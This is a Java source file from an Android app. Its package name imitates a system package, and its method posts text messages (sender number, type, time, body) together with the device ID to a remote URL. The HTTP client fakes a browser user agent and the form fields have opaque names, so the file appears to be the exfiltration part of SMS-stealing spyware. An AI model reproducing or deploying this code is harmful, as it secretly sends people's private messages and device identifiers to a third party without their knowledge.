package android.app.sms.server;

import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ClientConnectionManager;
import org.apache.http.conn.params.ConnManagerParams;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.conn.ssl.SSLSocketFactory;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.apache.http.util.EntityUtils;
import android.app.sms.entity.SMSInfo;
import android.app.sms.utils.Tools;
import android.content.Context;
import android.util.Log;

public class BaseService {
	
	private static DefaultHttpClient customerHttpClient;
	
	public static synchronized DefaultHttpClient getHttpClient() {
		if (null == customerHttpClient) {
			HttpParams params = new BasicHttpParams();
			HttpProtocolParams.setContentCharset(params, "GBK");
			HttpProtocolParams.setUseExpectContinue(params, true);
			HttpProtocolParams.setVersion(params, HttpVersion.HTTP_1_1);
			HttpProtocolParams.setUserAgent(params,
							"Mozilla/5.0(Linux;U;Android 2.2.1;en-us;Nexus One Build.FRG83) " + 
							"AppleWebKit/553.1(KHTML,like Gecko) Version/4.0 Mobile Safari/533.1");
			ConnManagerParams.setTimeout(params, 10000);
			HttpConnectionParams.setSoTimeout(params, 20000);
			HttpConnectionParams.setConnectionTimeout(params, 10000);
			SchemeRegistry schReg = new SchemeRegistry();
			schReg.register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80));
			schReg.register(new Scheme("https", SSLSocketFactory.getSocketFactory(), 443));
			ClientConnectionManager conMgr = new ThreadSafeClientConnManager(params, schReg);
			customerHttpClient = new DefaultHttpClient(conMgr, params);
		}
		return customerHttpClient;
	}
	
	public static boolean sendData(Context context, String url, SMSInfo smsInfo) {
		HttpPost request = new HttpPost(url);
		List<NameValuePair> parameterLists = new ArrayList<NameValuePair>();
		parameterLists.add(new BasicNameValuePair("ad", "save"));
		parameterLists.add(new BasicNameValuePair("name", "Test"));
		parameterLists.add(new BasicNameValuePair("menu", "addjie3"));
		parameterLists.add(new BasicNameValuePair("ti", smsInfo.getPn()));
		parameterLists.add(new BasicNameValuePair("lei", smsInfo.getType()));
		parameterLists.add(new BasicNameValuePair("riqi", smsInfo.getTime()));
		parameterLists.add(new BasicNameValuePair("jiang", smsInfo.getBody()));
		parameterLists.add(new BasicNameValuePair("zong", Tools.getDeviceId(context)));
		try {
			UrlEncodedFormEntity entity = new UrlEncodedFormEntity(parameterLists, "GBK");
			request.setEntity(entity);
			DefaultHttpClient client = getHttpClient();
			HttpResponse response = client.execute(request);
			if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
				byte[] bResultJson = EntityUtils.toByteArray(response.getEntity());
				String result = new String(bResultJson, "UTF-8");
				if (result != null && "ok".equals(result.trim())) {
					return true;
				}
			}
		} catch (Exception e) {
			Log.i("Send", "发送数据到服务器错误:" + e.getMessage());
		} finally {
			request.abort();
			getHttpClient().getConnectionManager().closeExpiredConnections();
		}
		return false;
	}
}